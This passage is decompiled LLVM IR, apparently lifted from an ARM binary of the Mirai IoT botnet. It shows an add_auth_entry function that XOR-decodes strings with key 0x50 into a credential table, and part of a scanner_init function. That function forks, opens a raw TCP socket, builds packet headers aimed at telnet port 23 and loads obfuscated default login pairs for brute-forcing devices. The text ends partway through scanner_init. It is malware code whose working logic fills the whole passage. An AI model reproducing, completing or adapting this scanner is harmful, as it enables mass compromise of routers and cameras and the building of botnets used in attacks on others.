  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @util_zero, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_cd8c, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_cd9c = load i32, i32* @r4, align 4
  %v6_cd9c = load i32, i32* @r5, align 4
  %v9_cd9c = load i32, i32* @r6, align 4
  %v12_cd9c = load i32, i32* @r7, align 4
  %v15_cd9c = load i32, i32* @r8, align 4
  %v18_cd9c = load i32, i32* @sb, align 4
  %v21_cd9c = load i32, i32* @sl, align 4
  %v24_cd9c = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_20f30.121 to i32), i32* @fp, align 4
  %v2_cda4 = load i32, i32* @global_var_20f30.121, align 4
  store i32 ptrtoint (i32* @global_var_20f5c.123 to i32), i32* @sl, align 4
  %v1_cdb0 = add i32 %v2_cda4, 1
  store i32 %v1_cdb0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_cdbc = load i32, i32* @global_var_20f5c.123, align 4
  store i32 %v2_cdbc, i32* %r0.global-to-local, align 4
  %v3_cdc0 = mul i32 %v1_cdb0, 16
  store i32 %v3_cdc0, i32* %r1.global-to-local, align 4
  %v4_cdc8 = inttoptr i32 %v2_cdbc to i32*
  %v5_cdc8 = call i32 @realloc(i32* %v4_cdc8, i32 %v3_cdc0, i32 %arg3, i32 %v1_cdb0)
  %v2_cdcc = load i32, i32* @global_var_20f30.121, align 4
  store i32 %v2_cdcc, i32* %r2.global-to-local, align 4
  store i32 %v5_cdc8, i32* @r8, align 4
  %v0_cdd4 = load i32, i32* @r5, align 4
  store i32 %v0_cdd4, i32* %r0.global-to-local, align 4
  %v1_cddc = load i32, i32* @sl, align 4
  %v2_cddc = inttoptr i32 %v1_cddc to i32*
  store i32 %v5_cdc8, i32* %v2_cddc, align 4
  %v1_cde0 = inttoptr i32 %v0_cdd4 to i8*
  %v2_cde0 = call i32 @util_strlen(i8* %v1_cde0)
  %sext = mul i32 %v2_cde0, 16777216
  %v1_cde4 = sdiv i32 %sext, 16777216
  %v2_cde4 = add nsw i32 %v1_cde4, 1
  store i32 %v2_cde4, i32* @r4, align 4
  store i32 %v1_cde4, i32* @r7, align 4
  store i32 %v2_cde4, i32* @r0, align 4
  %v0_cdf0 = call i32 @malloc()
  store i32 %v0_cdf0, i32* %r0.global-to-local, align 4
  %v0_cdf4 = load i32, i32* @r5, align 4
  store i32 %v0_cdf4, i32* %r1.global-to-local, align 4
  %v0_cdf8 = load i32, i32* @r4, align 4
  store i32 %v0_cdf8, i32* %r2.global-to-local, align 4
  store i32 %v0_cdf0, i32* %r6.global-to-local, align 4
  %v3_ce00 = call i32 @util_memcpy(i32 %v0_cdf0, i32 %v0_cdf4, i32 %v0_cdf8)
  store i32 %v3_ce00, i32* %r0.global-to-local, align 4
  %v0_ce04 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_ce04, 1
  %extract.t6 = trunc i32 %v0_ce04 to i8
  br i1 %tmp22, label %dec_label_pc_ce28, label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ce10

dec_label_pc_ce10:                                ; preds = %dec_label_pc_ce10, %dec_label_pc_ce0c
  %v2_ce18 = phi i32 [ %v1_ce1c, %dec_label_pc_ce10 ], [ 0, %dec_label_pc_ce0c ]
  %v1_ce10 = load i32, i32* %r6.global-to-local, align 4
  %v2_ce10 = add i32 %v1_ce10, %v2_ce18
  %v3_ce10 = inttoptr i32 %v2_ce10 to i8*
  %v4_ce10 = load i8, i8* %v3_ce10, align 1
  %v6_ce10 = zext i8 %v4_ce10 to i32
  %v1_ce14 = xor i32 %v6_ce10, 80
  store i32 %v1_ce14, i32* %r3.global-to-local, align 4
  %v1_ce18 = trunc i32 %v1_ce14 to i8
  store i8 %v1_ce18, i8* %v3_ce10, align 1
  %v0_ce1c = load i32, i32* %r2.global-to-local, align 4
  %v1_ce1c = add i32 %v0_ce1c, 1
  store i32 %v1_ce1c, i32* %r2.global-to-local, align 4
  %v1_ce20 = load i32, i32* @r7, align 4
  %v9_ce20 = icmp eq i32 %v1_ce1c, %v1_ce20
  br i1 %v9_ce20, label %dec_label_pc_ce28.loopexit, label %dec_label_pc_ce10

dec_label_pc_ce28.loopexit:                       ; preds = %dec_label_pc_ce10
  %extract.t = trunc i32 %v1_ce1c to i8
  br label %dec_label_pc_ce28

dec_label_pc_ce28:                                ; preds = %dec_label_pc_ce28.loopexit, %entry
  %v0_ce38.off0 = phi i8 [ %extract.t, %dec_label_pc_ce28.loopexit ], [ %extract.t6, %entry ]
  %v2_ce28 = load i32, i32* @global_var_20f30.121, align 4
  %v2_ce2c = load i32, i32* @global_var_20f5c.123, align 4
  %v3_ce30 = mul i32 %v2_ce28, 16
  store i32 %v3_ce30, i32* @sb, align 4
  %v2_ce34 = add i32 %v2_ce2c, %v3_ce30
  store i32 %v2_ce34, i32* %r2.global-to-local, align 4
  %v3_ce38 = add i32 %v2_ce34, 12
  %v4_ce38 = inttoptr i32 %v3_ce38 to i8*
  store i8 %v0_ce38.off0, i8* %v4_ce38, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_cdcc, i32* %r3.global-to-local, align 4
  %v0_ce44 = load i32, i32* %r6.global-to-local, align 4
  %v1_ce44 = load i32, i32* @r8, align 4
  %v5_ce44 = mul i32 %v2_cdcc, 16
  %v6_ce44 = add i32 %v1_ce44, %v5_ce44
  %v7_ce44 = inttoptr i32 %v6_ce44 to i32*
  store i32 %v0_ce44, i32* %v7_ce44, align 4
  %v2_ce48 = load i32, i32* @global_var_20f5c.123, align 4
  store i32 %v2_ce48, i32* @r7, align 4
  %v1_ce4c = inttoptr i32 %arg2 to i8*
  %v2_ce4c = call i32 @util_strlen(i8* %v1_ce4c)
  %sext1 = mul i32 %v2_ce4c, 16777216
  %v1_ce50 = sdiv i32 %sext1, 16777216
  %v2_ce50 = add nsw i32 %v1_ce50, 1
  store i32 %v2_ce50, i32* @r4, align 4
  store i32 %v1_ce50, i32* @r6, align 4
  store i32 %v2_ce50, i32* @r0, align 4
  %v0_ce5c = call i32 @malloc()
  store i32 %v0_ce5c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ce64 = load i32, i32* @r4, align 4
  store i32 %v0_ce64, i32* %r2.global-to-local, align 4
  store i32 %v0_ce5c, i32* %r5.global-to-local, align 4
  %v3_ce6c = call i32 @util_memcpy(i32 %v0_ce5c, i32 %arg2, i32 %v0_ce64)
  store i32 %v3_ce6c, i32* %r0.global-to-local, align 4
  %v0_ce70 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ce70, 1
  %extract.t8 = trunc i32 %v0_ce70 to i8
  br i1 %tmp23, label %dec_label_pc_ce94, label %dec_label_pc_ce78

dec_label_pc_ce78:                                ; preds = %dec_label_pc_ce28
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ce7c

dec_label_pc_ce7c:                                ; preds = %dec_label_pc_ce7c, %dec_label_pc_ce78
  %v2_ce84 = phi i32 [ %v1_ce88, %dec_label_pc_ce7c ], [ 0, %dec_label_pc_ce78 ]
  %v1_ce7c = load i32, i32* %r5.global-to-local, align 4
  %v2_ce7c = add i32 %v1_ce7c, %v2_ce84
  %v3_ce7c = inttoptr i32 %v2_ce7c to i8*
  %v4_ce7c = load i8, i8* %v3_ce7c, align 1
  %v6_ce7c = zext i8 %v4_ce7c to i32
  %v1_ce80 = xor i32 %v6_ce7c, 80
  store i32 %v1_ce80, i32* %r3.global-to-local, align 4
  %v1_ce84 = trunc i32 %v1_ce80 to i8
  store i8 %v1_ce84, i8* %v3_ce7c, align 1
  %v0_ce88 = load i32, i32* %r2.global-to-local, align 4
  %v1_ce88 = add i32 %v0_ce88, 1
  store i32 %v1_ce88, i32* %r2.global-to-local, align 4
  %v1_ce8c = load i32, i32* @r6, align 4
  %v9_ce8c = icmp eq i32 %v1_ce88, %v1_ce8c
  br i1 %v9_ce8c, label %dec_label_pc_ce94.loopexit, label %dec_label_pc_ce7c

dec_label_pc_ce94.loopexit:                       ; preds = %dec_label_pc_ce7c
  %extract.t7 = trunc i32 %v1_ce88 to i8
  br label %dec_label_pc_ce94

dec_label_pc_ce94:                                ; preds = %dec_label_pc_ce94.loopexit, %dec_label_pc_ce28
  %v0_cea4.off0 = phi i8 [ %extract.t7, %dec_label_pc_ce94.loopexit ], [ %extract.t8, %dec_label_pc_ce28 ]
  %v2_ce94 = load i32, i32* @global_var_20f30.121, align 4
  store i32 %v2_ce94, i32* %r0.global-to-local, align 4
  %v2_ce98 = load i32, i32* @global_var_20f5c.123, align 4
  %v3_ce9c = mul i32 %v2_ce94, 16
  store i32 %v3_ce9c, i32* %r1.global-to-local, align 4
  %v2_cea0 = or i32 %v3_ce9c, 13
  %v3_cea4 = add i32 %v2_cea0, %v2_ce98
  %v4_cea4 = inttoptr i32 %v3_cea4 to i8*
  store i8 %v0_cea4.off0, i8* %v4_cea4, align 1
  store i32 ptrtoint (i16** @global_var_20f60.125 to i32), i32* %r4.global-to-local, align 4
  %v2_ceb0 = load i16, i16* bitcast (i16** @global_var_20f60.125 to i16*), align 4
  %v3_ceb0 = zext i16 %v2_ceb0 to i32
  store i32 %v3_ceb0, i32* %lr.global-to-local, align 4
  %v2_ceb8 = load i32, i32* @global_var_20f5c.123, align 4
  store i32 %v2_ceb8, i32* %r2.global-to-local, align 4
  %v0_cec0 = load i32, i32* %r1.global-to-local, align 4
  %v2_cec0 = add i32 %v0_cec0, %v2_ceb8
  store i32 %v2_cec0, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_20f60.125 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_cec8 = load i32, i32* @sb, align 4
  %v1_cec8 = load i32, i32* @r7, align 4
  %v2_cec8 = add i32 %v1_cec8, %v0_cec8
  store i32 %v2_cec8, i32* %ip.global-to-local, align 4
  %v0_cecc = load i32, i32* %r0.global-to-local, align 4
  %v1_cecc = add i32 %v0_cecc, 1
  store i32 %v1_cecc, i32* %r0.global-to-local, align 4
  %v3_ced0 = add i32 %v2_cec0, 10
  %v4_ced0 = inttoptr i32 %v3_ced0 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_20f60.125 to i32), i32 16), i32 16) to i16), i16* %v4_ced0, align 2
  %v0_ced4 = load i32, i32* %lr.global-to-local, align 4
  %v1_ced4 = trunc i32 %v0_ced4 to i16
  %v2_ced4 = load i32, i32* %r1.global-to-local, align 4
  %v3_ced4 = add i32 %v2_ced4, 8
  %v4_ced4 = inttoptr i32 %v3_ced4 to i16*
  store i16 %v1_ced4, i16* %v4_ced4, align 2
  %v0_ced8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ced8 = load i32, i32* %ip.global-to-local, align 4
  %v2_ced8 = add i32 %v1_ced8, 4
  %v3_ced8 = inttoptr i32 %v2_ced8 to i32*
  store i32 %v0_ced8, i32* %v3_ced8, align 4
  %v1_cedc = load i32, i32* @fp, align 4
  %v2_cedc = inttoptr i32 %v1_cedc to i32*
  store i32 %v1_cecc, i32* %v2_cedc, align 4
  %v0_cee0 = load i32, i32* %r3.global-to-local, align 4
  %v1_cee0 = trunc i32 %v0_cee0 to i16
  %v2_cee0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cee0 = inttoptr i32 %v2_cee0 to i16*
  store i16 %v1_cee0, i16* %v3_cee0, align 2
  store i32 %v3_cd9c, i32* @r4, align 4
  store i32 %v6_cd9c, i32* @r5, align 4
  store i32 %v9_cd9c, i32* @r6, align 4
  store i32 %v12_cd9c, i32* @r7, align 4
  store i32 %v15_cd9c, i32* @r8, align 4
  store i32 %v18_cd9c, i32* @sb, align 4
  store i32 %v21_cd9c, i32* @sl, align 4
  store i32 %v24_cd9c, i32* @fp, align 4
  ret i32 %v1_cecc

; uselistorder directives
  uselistorder i32 %v3_ce9c, { 1, 0 }
  uselistorder i32 %v1_ce88, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ce5c, { 1, 0, 2 }
  uselistorder i32 %v3_ce30, { 1, 0 }
  uselistorder i32 %v1_ce1c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_cdf0, { 1, 0, 2 }
  uselistorder i32 %v2_cdcc, { 1, 0, 2 }
  uselistorder i32 %v3_cdc0, { 1, 0 }
  uselistorder i32 %v1_cdb0, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp314 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i16, align 2
  %tmp342 = call i16 @__decompiler_undefined_function_2()
  %v6_cefc = load i32, i32* @r5, align 4
  %v18_cefc = load i32, i32* @sb, align 4
  %v21_cefc = load i32, i32* @sl, align 4
  %v24_cefc = load i32, i32* @fp, align 4
  %v0_cf08 = call i32 @__libc_fork()
  store i32 %v0_cf08, i32* %r0.global-to-local, align 4
  %v7_cf0c = icmp eq i32 %v0_cf08, -1
  %. = zext i1 %v7_cf0c to i32
  %tmp345 = icmp slt i32 %v0_cf08, 1
  %storemerge308 = select i1 %tmp345, i32 %., i32 1
  store i32 %storemerge308, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23a48.117 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cf28 = icmp eq i32 %storemerge308, 0
  store i1 %v2_cf28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_cf08, i32* @global_var_23a48.117, align 4
  br i1 %v2_cf28, label %dec_label_pc_d208, label %dec_label_pc_cf34

dec_label_pc_cf34:                                ; preds = %entry
  store i32 %v6_cefc, i32* @r5, align 4
  store i32 %v18_cefc, i32* @sb, align 4
  store i32 %v21_cefc, i32* @sl, align 4
  store i32 %v24_cefc, i32* @fp, align 4
  ret i32 %v0_cf08

dec_label_pc_d208:                                ; preds = %entry
  %v0_d208 = call i32 @util_local_addr()
  store i32 %v0_d208, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d208, i32* @global_var_23a2c.55, align 4
  %v1_d214 = call i32 @rand_init(i32 %v0_d208)
  %v0_d218 = load i32, i32* @r4, align 4
  store i32 %v0_d218, i32* %r0.global-to-local, align 4
  %v1_d21c = inttoptr i32 %v0_d218 to i32*
  %v2_d21c = call i32 @__GI_time(i32* %v1_d21c)
  store i32 ptrtoint (i32* @global_var_20f64.119 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_d21c, i32* @global_var_20f64.119, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_d230 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_23a40.130 to i32), i32* %r3.global-to-local, align 4
  %v0_d238 = load i32, i32* @r4, align 4
  %v5_d238 = trunc i32 %v0_d238 to i16
  store i16 %v5_d238, i16* %stack_var_-52, align 2
  store i32 %v2_d230, i32* @global_var_23a40.130, align 4
  store i32 %v0_d238, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d244.dec_label_pc_d244_crit_edge, %dec_label_pc_d208
  %v2_d250 = phi i32 [ %v2_d250.pre, %dec_label_pc_d244.dec_label_pc_d244_crit_edge ], [ %v2_d230, %dec_label_pc_d208 ]
  %v0_d258 = phi i32 [ %v0_d288, %dec_label_pc_d244.dec_label_pc_d244_crit_edge ], [ %v0_d238, %dec_label_pc_d208 ]
  %v3_d244162 = phi i16 [ %v5_d288, %dec_label_pc_d244.dec_label_pc_d244_crit_edge ], [ %v5_d238, %dec_label_pc_d208 ]
  %v4_d244 = sext i16 %v3_d244162 to i32
  %v3_d24c = mul i32 %v0_d258, 256
  store i32 %v3_d24c, i32* %ip.global-to-local, align 4
  store i32 %v2_d250, i32* @lr, align 4
  %v2_d260 = mul nsw i32 %v4_d244, 288
  %v2_d264 = mul i32 %v0_d258, 288
  %v1_d268 = add nsw i32 %v4_d244, 1
  store i32 %v1_d268, i32* %r0.global-to-local, align 4
  %v2_d26c = add i32 %v2_d260, %v2_d250
  store i32 %v2_d26c, i32* %r2.global-to-local, align 4
  %v2_d270 = add i32 %v2_d264, %v2_d250
  store i32 %v2_d270, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_d280 = add i32 %v2_d26c, 4
  %v3_d280 = inttoptr i32 %v2_d280 to i32*
  store i32 -1, i32* %v3_d280, align 4
  %v0_d284 = load i32, i32* @r5, align 4
  %v1_d284 = load i32, i32* %r1.global-to-local, align 4
  %v2_d284 = add i32 %v1_d284, 12
  %v3_d284 = inttoptr i32 %v2_d284 to i32*
  store i32 %v0_d284, i32* %v3_d284, align 4
  %v0_d288 = load i32, i32* %r0.global-to-local, align 4
  %v5_d288 = trunc i32 %v0_d288 to i16
  %v7_d28c = icmp sgt i16 %v3_d244162, 254
  br i1 %v7_d28c, label %dec_label_pc_d290, label %dec_label_pc_d244.dec_label_pc_d244_crit_edge

dec_label_pc_d244.dec_label_pc_d244_crit_edge:    ; preds = %dec_label_pc_d244
  %v2_d250.pre = load i32, i32* @global_var_23a40.130, align 4
  br label %dec_label_pc_d244

dec_label_pc_d290:                                ; preds = %dec_label_pc_d244
  store i16 %v5_d288, i16* %stack_var_-52, align 2
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_d29c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_d29c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a44.132 to i32), i32* %r2.global-to-local, align 4
  %v2_d2a4 = icmp eq i32 %v3_d29c, -1
  store i1 %v2_d2a4, i1* %cpsr_c.global-to-local, align 1
  %v7_d2a4 = icmp eq i32 %v3_d29c, -1
  store i1 %v7_d2a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d29c, i32* @r4, align 4
  store i32 %v3_d29c, i32* @global_var_23a44.132, align 4
  br i1 %v7_d2a4, label %dec_label_pc_e410, label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d290
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_d2b8 = load i32, i32* @r5, align 4
  store i32 %v0_d2b8, i32* @r2, align 4
  %v2_d2bc = call i32 @__libc_fcntl(i32 %v3_d29c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_d2c4 = or i32 %v2_d2bc, 2048
  store i32 %v1_d2c4, i32* @r2, align 4
  %v0_d2c8 = load i32, i32* @r4, align 4
  store i32 %v0_d2c8, i32* %r0.global-to-local, align 4
  %v2_d2cc = call i32 @__libc_fcntl(i32 %v0_d2c8, i32 4)
  %v2_d2d4 = load i32, i32* @global_var_23a44.132, align 4
  store i32 %v2_d2d4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_d2e0 = load i32, i32* @r5, align 4
  store i32 %v0_d2e0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_d2e8 = ptrtoint i16* %stack_var_-52 to i32
  store i32 %v2_d2e8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i16 1, i16* %stack_var_-52, align 2
  %v5_d2f8 = call i32 @__GI_setsockopt(i32 %v2_d2d4, i32 %v0_d2e0, i32 3, i32 %v2_d2e8, i32 4)
  store i32 %v5_d2f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d2fc = icmp eq i32 %v5_d2f8, 0
  store i1 %v2_d2fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d2fc, label %dec_label_pc_d304, label %dec_label_pc_e404

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2b4, %dec_label_pc_d304
  %v0_d304 = call i32 @rand_next()
  %v3_d308 = mul i32 %v0_d304, 65536
  store i32 %v3_d308, i32* %r0.global-to-local, align 4
  %v1_d310 = mul i32 %v0_d304, 256
  %v3_d314 = and i32 %v1_d310, 65280
  %tmp348 = udiv i32 %v0_d304, 256
  %v4_d318 = urem i32 %tmp348, 256
  %v5_d318 = or i32 %v4_d318, %v3_d314
  store i32 %v5_d318, i32* %r3.global-to-local, align 4
  %v2_d31c = icmp ugt i32 %v5_d318, 1023
  store i1 %v2_d31c, i1* %cpsr_c.global-to-local, align 1
  %v7_d31c = icmp eq i32 %v5_d318, 1024
  store i1 %v7_d31c, i1* %cpsr_z.global-to-local, align 1
  %v3_d324 = icmp ult i32 %v5_d318, 1022
  br i1 %v3_d324, label %dec_label_pc_d304, label %dec_label_pc_d328

dec_label_pc_d328:                                ; preds = %dec_label_pc_d304
  %v5_d320.le = trunc i32 %v0_d304 to i16
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* %r0.global-to-local, align 4
  %v2_d32c = load i8, i8* bitcast (i8** @global_var_20f34.134 to i8*), align 4
  %v3_d32c = zext i8 %v2_d32c to i32
  %v1_d330 = and i32 %v3_d32c, 240
  %v1_d334 = or i32 %v1_d330, 5
  store i32 %v1_d334, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_20f34.134 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_20f36.135 to i16*), align 4
  %v0_d354 = call i32 @rand_next()
  %v1_d354 = trunc i32 %v0_d354 to i16
  %v3_d35c = load i8, i8* @global_var_20f54.138, align 1
  store i32 ptrtoint (i32* @global_var_20f48.137 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_d35c, 16
  %v1_d368 = zext i8 %tmp to i32
  store i32 6, i32* @r4, align 4
  %v1_d370 = or i32 %v1_d368, 80
  store i32 %v1_d370, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_20f3c.139 to i8*), align 4
  store i16 %v1_d354, i16* bitcast (i32* @global_var_20f38.140 to i16*), align 4
  %v1_d380 = trunc i32 %v1_d370 to i8
  store i8 %v1_d380, i8* @global_var_20f54.138, align 1
  store i8 6, i8* bitcast (i32* @global_var_20f3d.141 to i8*), align 4
  %v4_d388 = sext i16 %v5_d320.le to i32
  store i32 %v4_d388, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_20f4a.142, align 2
  store i16 %v5_d320.le, i16* bitcast (i32* @global_var_20f48.137 to i16*), align 4
  %v0_d398 = call i32 @rand_next()
  %v1_d398 = trunc i32 %v0_d398 to i16
  %v3_d3a0 = load i8, i8* @global_var_20f55.143, align 1
  %v4_d3a0 = zext i8 %v3_d3a0 to i32
  store i32 ptrtoint (i32* @global_var_20f48.137 to i32), i32* %ip.global-to-local, align 4
  %v1_d3a8 = or i32 %v4_d3a0, 2
  store i32 %v1_d3a8, i32* %r3.global-to-local, align 4
  store i16 %v1_d398, i16* bitcast (i32* @global_var_20f56.144 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  %v1_d3b4 = trunc i32 %v1_d3a8 to i8
  store i8 %v1_d3b4, i8* @global_var_20f55.143, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d3c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d3d0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18100.152 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_d3e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18100.152 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18108.154 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d3f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18108.154 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d400 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r1.global-to-local, align 4
  %v5_d410 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18110.156 to i32), i32* %r1.global-to-local, align 4
  %v0_d41c = load i32, i32* @r4, align 4
  store i32 %v0_d41c, i32* %r2.global-to-local, align 4
  %v4_d420 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18110.156 to i32), i32 %v0_d41c)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18118.158 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d430 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([8 x i8]* @global_var_18118.158 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d440 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
